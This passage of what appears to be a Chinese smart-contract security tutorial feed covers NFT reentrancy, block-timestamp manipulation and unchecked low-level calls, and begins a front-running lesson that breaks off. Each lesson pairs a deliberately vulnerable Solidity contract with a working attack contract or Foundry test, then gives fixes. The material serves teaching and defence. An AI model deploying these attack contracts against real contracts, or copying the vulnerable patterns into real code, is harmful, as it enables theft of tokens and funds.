铸造函数，每个用户可以免费铸造1个NFT。<strong>注意：这个函数有重入漏洞！</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">contract NFTReentrancy is ERC721 &#123;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    mapping(address =&gt; bool) public mintedAddress;</span><br><span class="line">    // 构造函数，初始化NFT合集的名称、代号</span><br><span class="line">    constructor() ERC721(&quot;Reentry NFT&quot;, &quot;ReNFT&quot;)&#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 铸造函数，每个用户只能铸造1个NFT</span><br><span class="line">    // 有重入漏洞</span><br><span class="line">    function mint() payable external &#123;</span><br><span class="line">        // 检查是否mint过</span><br><span class="line">        require(mintedAddress[msg.sender] == false);</span><br><span class="line">        // 增加total supply</span><br><span class="line">        totalSupply++;</span><br><span class="line">        // mint</span><br><span class="line">        _safeMint(msg.sender, totalSupply);</span><br><span class="line">        // 记录mint过的地址</span><br><span class="line">        mintedAddress[msg.sender] = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h3><p><code>NFTReentrancy</code>合约的重入攻击点在<code>mint()</code>函数会调用<code>ERC721</code>合约中的<code>_safeMint()</code>，从而调用转入地址的<code>_checkOnERC721Received()</code>函数。如果转入地址的<code>_checkOnERC721Received()</code>包含恶意代码，就能进行攻击。</p><p><code>Attack</code>合约继承了<code>IERC721Receiver</code>合约，它有 <code>1</code> 个状态变量<code>nft</code>记录了有漏洞的NFT合约地址。它有 <code>3</code> 个函数:</p><ul><li>构造函数: 初始化有漏洞的NFT合约地址。</li><li><code>attack()</code>: 攻击函数，调用NFT合约的<code>mint()</code>函数并发起攻击。</li><li><code>onERC721Received()</code>: 嵌入了恶意代码的ERC721回调函数，会重复调用<code>mint()</code>函数，并铸造100个NFT。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">contract Attack is IERC721Receiver&#123;</span><br><span class="line">    NFTReentrancy public nft; // 有漏洞的nft合约地址</span><br><span class="line"></span><br><span class="line">    // 初始化NFT合约地址</span><br><span class="line">    constructor(NFTReentrancy _nftAddr) &#123;</span><br><span class="line">        nft = _nftAddr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 攻击函数，发起攻击</span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        nft.mint();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ERC721的回调函数，会重复调用mint函数，铸造100个</span><br><span class="line">    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) &#123;</span><br><span class="line">        if(nft.balanceOf(address(this)) &lt; 100)&#123;</span><br><span class="line">            nft.mint();</span><br><span class="line">        &#125;</span><br><span class="line">        return this.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Remix复现"><a href="#Remix复现" class="headerlink" title="Remix复现"></a>Remix复现</h2><ol><li>部署<code>NFTReentrancy</code>合约。</li><li>部署<code>Attack</code>合约，参数填<code>NFTReentrancy</code>合约地址。</li><li>调用<code>Attack</code>合约的<code>attack()</code>函数发起攻击。</li><li>调用<code>NFTReentrancy</code>合约的<code>balanceOf()</code>函数查询<code>Attack</code>合约的持仓，可以看到持有<code>100</code>个NFT，攻击成功。</li></ol><p><img src="/2023/06/23/00.security/36.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_3/S16-2.png" alt="img"></p><h2 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h2><p>主要有两种办法来预防重入攻击漏洞： 检查-影响-交互模式（checks-effect-interaction）和重入锁。</p><ol><li>检查-影响-交互模式：它强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。我们可以用这个模式修复有漏洞的<code>mint()</code>函数:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function mint() payable external &#123;</span><br><span class="line">    // 检查是否mint过</span><br><span class="line">    require(mintedAddress[msg.sender] == false);</span><br><span class="line">    // 增加total supply</span><br><span class="line">    totalSupply++;</span><br><span class="line">    // 记录mint过的地址</span><br><span class="line">    mintedAddress[msg.sender] = true;</span><br><span class="line">    // mint</span><br><span class="line">    _safeMint(msg.sender, totalSupply);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>重入锁：它是一种防止重入函数的修饰器（modifier）。建议直接使用OpenZeppelin提供的<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol">ReentrancyGuard</a></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一讲，我们介绍了NFT的重入攻击漏洞，并攻击了一个有漏洞的NFT合约，铸造了100个NFT。目前主要有两种预防重入攻击的办法：检查-影响-交互模式（checks-effect-interaction）和重入锁。</p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>35.操纵区块时间</title>
      <link href="/2023/06/23/00.security/35.%E6%93%8D%E7%BA%B5%E5%8C%BA%E5%9D%97%E6%97%B6%E9%97%B4/"/>
      <url>/2023/06/23/00.security/35.%E6%93%8D%E7%BA%B5%E5%8C%BA%E5%9D%97%E6%97%B6%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="操纵区块时间"><a href="#操纵区块时间" class="headerlink" title="操纵区块时间"></a>操纵区块时间</h1><p>这一讲，我们将介绍智能合约的操纵区块时间攻击，并使用 Foundry 复现。在合并（The Merge）之前，以太坊矿工可以操纵区块时间，如果抽奖合约的伪随机数依赖于区块时间，则可能被攻击。</p><h2 id="区块时间"><a href="#区块时间" class="headerlink" title="区块时间"></a>区块时间</h2><p>区块时间（block timestamp）是包含在以太坊区块头中的一个 <code>uint64</code> 值，代表此区块创建的 UTC 时间戳（单位：秒），在合并（The Merge）之前，以太坊会根据算力调整区块难度，因此出块时间不定，平均 14.5s 出一个区块，矿工可以操纵区块时间；合并之后，改为固定 12s 一个区块，验证节点不能操纵区块时间。</p><p>在 Solidity 中，开发者可以通过全局变量 <code>block.timestamp</code> 获取当前区块的时间戳，类型为 <code>uint256</code>。</p><h2 id="漏洞例子"><a href="#漏洞例子" class="headerlink" title="漏洞例子"></a>漏洞例子</h2><p>此例子由<a href="https://github.com/AmazingAng/WTF-Solidity/tree/main/32_Faucet">WTF Solidity合约安全: S07. 坏随机数</a>中的合约改写而成。我们改变了 <code>mint()</code> 铸造函数的条件：当区块时间能被 170 整除时才能成功铸造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract TimeMnipulation is ERC721 &#123;</span><br><span class="line">    uint256 totalSupply;</span><br><span class="line"></span><br><span class="line">    // 构造函数，初始化NFT合集的名称、代号</span><br><span class="line">    constructor() ERC721(&quot;&quot;, &quot;&quot;)&#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 铸造函数：当区块时间能被7整除时才能mint成功</span><br><span class="line">    function luckyMint() external returns(bool success)&#123;</span><br><span class="line">        if(block.timestamp % 170 == 0)&#123;</span><br><span class="line">            _mint(msg.sender, totalSupply); // mint</span><br><span class="line">            totalSupply++;</span><br><span class="line">            success = true;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            success = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Foundry复现攻击"><a href="#Foundry复现攻击" class="headerlink" title="Foundry复现攻击"></a>Foundry复现攻击</h2><p>攻击者只需操纵区块时间，将它设为能被 170 整除的数字，就可以成功铸造 NFT。我们选择 Foundry 来复现这个攻击，因为它提供了修改区块时间的作弊码（cheatcodes）。如果你不了解 Foundry/作弊码，可以阅读 <a href="https://github.com/AmazingAng/WTFSolidity/blob/main/Topics/Tools/TOOL07_Foundry/readme.md">Foundry教程</a> 和 <a href="https://book.getfoundry.sh/forge/cheatcodes">Foundry Book</a>。</p><p>代码大致逻辑</p><ol><li>创建一个 <code>TimeManipulation</code> 合约变量 <code>nft</code>。</li><li>创建一个钱包地址 <code>alice</code>。</li><li>使用作弊码 <code>vm.warp()</code> 将区块时间改为 169，由于不能被170整除，铸造失败。</li><li>使用作弊码 <code>vm.warp()</code> 将区块时间改为 17000，由于可以被170整除，铸造成功。</li></ol><p>代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: UNLICENSED</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.4</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;forge-std/Test.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;forge-std/console.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../src/TimeManipulation.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">TimeManipulationTest</span> is <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="title class_">TimeManipulation</span> public nft;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Computes address for a given private key</span></span><br><span class="line">    address alice = vm.<span class="title function_">addr</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setUp</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        nft = <span class="keyword">new</span> <span class="title class_">TimeManipulation</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// forge test -vv --match-test  testMint</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">testMint</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Condition 1: block.timestamp % 170 != 0&quot;</span>);</span><br><span class="line">        <span class="comment">// Set block.timestamp to 169</span></span><br><span class="line">        vm.<span class="title function_">warp</span>(<span class="number">169</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;block.timestamp: %s&quot;</span>, block.<span class="property">timestamp</span>);</span><br><span class="line">        <span class="comment">// Sets all subsequent calls&#x27; msg.sender to be the input address</span></span><br><span class="line">        <span class="comment">// until `stopPrank` is called</span></span><br><span class="line">        vm.<span class="title function_">startPrank</span>(alice);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;alice balance before mint: %s&quot;</span>, nft.<span class="title function_">balanceOf</span>(alice));</span><br><span class="line">        nft.<span class="title function_">luckyMint</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;alice balance after mint: %s&quot;</span>, nft.<span class="title function_">balanceOf</span>(alice));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Set block.timestamp to 17000</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Condition 2: block.timestamp % 170 == 0&quot;</span>);</span><br><span class="line">        vm.<span class="title function_">warp</span>(<span class="number">17000</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;block.timestamp: %s&quot;</span>, block.<span class="property">timestamp</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;alice balance before mint: %s&quot;</span>, nft.<span class="title function_">balanceOf</span>(alice));</span><br><span class="line">        nft.<span class="title function_">luckyMint</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;alice balance after mint: %s&quot;</span>, nft.<span class="title function_">balanceOf</span>(alice));</span><br><span class="line">        vm.<span class="title function_">stopPrank</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在安装好 Foundry 之后，在命令行输入下列命令启动新项目，并安装 openzeppelin 库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">forge init TimeMnipulation</span><br><span class="line">cd TimeMnipulation</span><br><span class="line">forge install Openzeppelin/openzeppelin-contracts</span><br></pre></td></tr></table></figure><p>将这一讲的代码分别复制到<code>src</code>和<code>test</code>目录下，然后使用下列命令启动测试用例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge test -vv --match-test testMint</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Running 1 test for test/TimeManipulation.t.sol:TimeManipulationTest</span><br><span class="line">[PASS] testMint() (gas: 94666)</span><br><span class="line">Logs:</span><br><span class="line">  Condition 1: block.timestamp % 170 != 0</span><br><span class="line">  block.timestamp: 169</span><br><span class="line">  alice balance before mint: 0</span><br><span class="line">  alice balance after mint: 0</span><br><span class="line">  Condition 2: block.timestamp % 170 == 0</span><br><span class="line">  block.timestamp: 17000</span><br><span class="line">  alice balance before mint: 0</span><br><span class="line">  alice balance after mint: 1</span><br><span class="line"></span><br><span class="line">Test result: ok. 1 passed; 0 failed; finished in 7.64ms</span><br></pre></td></tr></table></figure><p>我们可以看到，当我们将<code>block.timestamp</code> 修改为 17000时，铸造成功。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一讲，我们介绍了智能合约的操纵区块时间攻击，并使用 Foundry 复现了它。在合并（The Merge）之前，以太坊矿工可以操纵区块时间，如果抽奖合约的伪随机数依赖于区块时间，则可能被攻击。合并之后，以太坊改为固定 12s 一个区块，并且验证节点不能操纵区块时间。因此这类攻击不会在以太坊上发生，但仍可能在其他公链中遇到。</p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>34.未检查的低级调用</title>
      <link href="/2023/06/23/00.security/34.%E6%9C%AA%E6%A3%80%E6%9F%A5%E7%9A%84%E4%BD%8E%E7%BA%A7%E8%B0%83%E7%94%A8/"/>
      <url>/2023/06/23/00.security/34.%E6%9C%AA%E6%A3%80%E6%9F%A5%E7%9A%84%E4%BD%8E%E7%BA%A7%E8%B0%83%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="未检查的低级调用"><a href="#未检查的低级调用" class="headerlink" title="未检查的低级调用"></a>未检查的低级调用</h1><p>这一讲，我们将介绍智能合约的未检查低级调用（low-level call）的漏洞。失败的低级调用不会让交易回滚，如果合约中忘记对其返回值进行检查，往往会出现严重的问题。</p><h2 id="低级调用"><a href="#低级调用" class="headerlink" title="低级调用"></a>低级调用</h2><p>以太坊的低级调用包括 <code>call()</code>，<code>delegatecall()</code>，<code>staticcall()</code>，和<code>send()</code>。这些函数与 Solidity 其他函数不同，当出现异常时，它并不会向上层传递，也不会导致交易完全回滚；它只会返回一个布尔值 <code>false</code> ，传递调用失败的信息。因此，如果未检查低级函数调用的返回值，则无论低级调用失败与否，上层函数的代码会继续运行。对于低级调用更多的内容，请阅读 <a href="https://github.com/AmazingAng/WTF-Solidity">WTF Solidity 极简教程第20-23讲</a>。</p><p>最容易出错的是<code>send()</code>：一些合约使用 <code>send()</code> 发送 <code>ETH</code>，但是 <code>send()</code> 限制 gas 要低于 2300，否则会失败。当目标地址的回调函数比较复杂时，花费的 gas 将高于 2300，从而导致 <code>send()</code> 失败。如果此时在上层函数没有检查返回值的话，交易继续执行，就会出现意想不到的问题。2016年，有一款叫 <code>King of Ether</code> 的链游，因为这个漏洞导致退款无法正常发送（<a href="https://www.kingoftheether.com/postmortem.html">验尸报告</a>）。</p><p><img src="/2023/06/23/00.security/34.%E6%9C%AA%E6%A3%80%E6%9F%A5%E7%9A%84%E4%BD%8E%E7%BA%A7%E8%B0%83%E7%94%A8/S13-1.png" alt="img"></p><h2 id="漏洞例子"><a href="#漏洞例子" class="headerlink" title="漏洞例子"></a>漏洞例子</h2><h3 id="银行合约"><a href="#银行合约" class="headerlink" title="银行合约"></a>银行合约</h3><p>这个合约是在<code>S01 重入攻击</code>教程中的银行合约基础上修改而成。它包含<code>1</code>个状态变量<code>balanceOf</code>记录所有用户的以太坊余额；并且包含<code>3</code>个函数：</p><ul><li><code>deposit()</code>：存款函数，将<code>ETH</code>存入银行合约，并更新用户的余额。</li><li><code>withdraw()</code>：提款函数，将调用者的余额转给它。具体步骤和上面故事中一样：查询余额，更新余额，转账。<strong>注意：这个函数没有检查 <code>send()</code> 的返回值，提款失败但余额会清零！</strong></li><li><code>getBalance()</code>：获取银行合约里的<code>ETH</code>余额。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">contract UncheckedBank &#123;</span><br><span class="line">    mapping (address =&gt; uint256) public balanceOf;    // 余额mapping</span><br><span class="line"></span><br><span class="line">    // 存入ether，并更新余额</span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        balanceOf[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 提取msg.sender的全部ether</span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        // 获取余额</span><br><span class="line">        uint256 balance = balanceOf[msg.sender];</span><br><span class="line">        require(balance &gt; 0, &quot;Insufficient balance&quot;);</span><br><span class="line">        balanceOf[msg.sender] = 0;</span><br><span class="line">        // Unchecked low-level call</span><br><span class="line">        bool success = payable(msg.sender).send(balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取银行合约的余额</span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><p>我们构造了一个攻击合约，它刻画了一个倒霉的储户，取款失败但是银行余额清零：合约回调函数 <code>receive()</code> 中的 <code>revert()</code> 将回滚交易，因此它无法接收 <code>ETH</code>；但是提款函数 <code>withdraw()</code> 却能正常调用，清空余额。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    UncheckedBank public bank; // Bank合约地址</span><br><span class="line"></span><br><span class="line">    // 初始化Bank合约地址</span><br><span class="line">    constructor(UncheckedBank _bank) &#123;</span><br><span class="line">        bank = _bank;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 回调函数，转账ETH时会失败</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 存款函数，调用时 msg.value 设为存款数量</span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        bank.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 取款函数，虽然调用成功，但实际上取款失败</span><br><span class="line">    function withdraw() external payable &#123;</span><br><span class="line">        bank.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取本合约的余额</span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Remix复现"><a href="#Remix复现" class="headerlink" title="Remix复现"></a><code>Remix</code>复现</h2><ol><li>部署 <code>UncheckedBank</code> 合约。</li><li>部署 <code>Attack</code> 合约，构造函数填入 <code>UncheckedBank</code> 合约地址。</li><li>调用 <code>Attack</code> 合约的 <code>deposit()</code> 存款函数，存入<code>1 ETH</code>。</li><li>调用 <code>Attack</code> 合约的 <code>withdraw()</code> 提款函数，进行提款，调用成功。</li><li>分别调用 <code>UncheckedBank</code> 合约的 <code>balanceOf()</code> 函数和 <code>Attack</code> 合约的 <code>getBalance()</code> 函数。尽管上一步调用成功并且储户余额被清空，但是提款失败了。</li></ol><h2 id="预防办法"><a href="#预防办法" class="headerlink" title="预防办法"></a>预防办法</h2><p>你可以使用以下几种方法来预防未检查低级调用的漏洞：</p><ol><li><p>检查低级调用的返回值，在上面的银行合约中，我们可以改正 <code>withdraw()</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bool success = payable(msg.sender).send(balance);</span><br><span class="line">require(success, &quot;Failed Sending ETH!&quot;)</span><br></pre></td></tr></table></figure></li><li><p>合约转账<code>ETH</code>时，使用 <code>call()</code>，并做好重入保护。</p></li><li><p>使用<code>OpenZeppelin</code>的<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol">Address库</a>，它将检查返回值的低级调用封装好了。</p></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们将介绍未检查低级调用的漏洞及其预防方法。以太坊的低级调用（call, delegatecall, staticcall, send）在失败时会返回一个布尔值 false，但不会让整个交易回滚。如果开发者没有对它进行检查的话，则会发生意外。</p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>33.抢先交易_2</title>
      <link href="/2023/06/23/00.security/33.%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93_2/"/>
      <url>/2023/06/23/00.security/33.%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93_2/</url>
      
        <content type="html"><![CDATA[<h1 id="抢先交易-2"><a href="#抢先交易-2" class="headerlink" title="抢先交易_2"></a>抢先交易_2</h1><p>这一讲，我们将介绍智能合约的抢先交易（Front-running，抢跑）。据统计，以太坊上的套利者通过三明治攻击（sandwich attack）<a href="https://dune.com/chorus_one/ethereum-mev-data">共获利$12亿</a>。</p><h2 id="Front-running"><a href="#Front-running" class="headerlink" title="Front-running"></a>Front-running</h2><h3 id="传统抢跑"><a href="#传统抢跑" class="headerlink" title="传统抢跑"></a>传统抢跑</h3><p>抢跑最初诞生于传统金融市场，是一场单纯为了利益的竞赛。在金融市场中，信息差催生了金融中介机构，他们可以通过最先了解某些行业信息并最先做出反应从而实现获利。这些攻击主要发生在股票市场交易和早期的域名注册。</p><p>2021 年 9 月，NFT 市场 OpenSea 的产品负责人 Nate Chastain，被发现通过抢先购买将在 OpenSea 首页展示的 NFT 获利。 他利用内幕信息来获得不公平的信息差，OpenSea 将要在首页推送哪些 NFT，然后在展出在首页前抢先买入，然后再在 NFT 登上首页后卖出。然而，有一个人通过将 NFT 交易时间戳与 OpenSea 上有问题的 NFT 的首页促销进行匹配，发现了这一非法行为，Nate 也被告上法院。</p><p>另一个传统抢跑的例子包括是在代币上<a href="https://www.wsj.com/articles/crypto-might-have-an-insider-trading-problem-11653084398?mod=hp_lista_pos4">币安</a>/<a href="https://www.protocol.com/fintech/coinbase-crypto-insider-trading">coinbase</a>等知名交易所之前，会有得知内幕消息的老鼠仓提前买入。在上币的公告发出后，币价会大幅上涨，这时抢跑者会卖出盈利。</p><h3 id="链上抢跑"><a href="#链上抢跑" class="headerlink" title="链上抢跑"></a>链上抢跑</h3><p>链上抢跑指的是搜索者或矿工通过调高<code>gas</code>或其他方法将自己的交易安插在其他交易之前，来攫取价值。在区块链中，矿工可以通过打包、排除或重新排序他们产生的区块中的交易来获得一定的利润，而<code>MEV</code>是衡量这种利润的指标。</p><p>在用户的交易被矿工打包进以太坊区块链之前，大部分交易会汇集到Mempool（交易内存池）中，矿工在这里寻找费用高的交易优先打包出块，实现利益最大化。通常来说，gas price越高的交易，越容易被打包。同时，一些<code>MEV</code>机器人也会搜索<code>mempool</code>中有利可图的交易。比如，一笔在去中心化交易所中滑点设置过高的<code>swap</code>交易可能会被三明治攻击：通过调整gas，套利者会在这笔交易之前插一个买单，再在之后发送一个卖单，并从中盈利。这等效于哄抬市价。</p><p><img src="/2023/06/23/00.security/33.%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93_2/S11-1.png" alt="img"></p><h2 id="抢跑实践"><a href="#抢跑实践" class="headerlink" title="抢跑实践"></a>抢跑实践</h2><p>如果你学会了抢跑，你就算是入门的币圈科学家了。接下来，让我们实践一下，抢跑一笔铸造NFT的交易。我们将会用到的工具：</p><ul><li><code>Foundry</code>的<code>anvil</code>工具搭建本地测试链，请提前安装好 <a href="https://book.getfoundry.sh/getting-started/installation">foundry</a>。</li><li><code>remix</code>进行NFT合约的部署和铸造</li><li><code>etherjs</code>脚本监听<code>mempool</code>并进行抢跑。</li></ul><p><strong>1. 启动Foundry本地测试链：</strong> 在安装好 <code>foundry</code> 之后，在命令行输入 <code>anvil --chain-id 1234 -b 10</code> 搭建本地测试链，chain-id 为 1234，每 10 秒产出一个区块。搭建成功后，它会在显示一些测试账户的地址和私钥，每个账户有 10000 ETH。你可以使用它们进行测试。</p><p><img src="/2023/06/23/00.security/33.%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93_2/S11-2.png" alt="img"></p><p><strong>2. 将Remix连接到测试链：</strong> 打开 Remix 的部署页面，打开左上角的<code>Environment</code>下拉菜单，选<code>Foundry Provider</code>即可将 Remix 连接到测试链。</p><p><img src="/2023/06/23/00.security/33.%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93_2/S11-3.png" alt="img"></p><p><strong>3. 部署NFT合约：</strong> 在 Remix 上部署一个简单的 freemint（免费铸造）NFT合约。它有一个<code>mint()</code>，用于免费铸造NFT。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 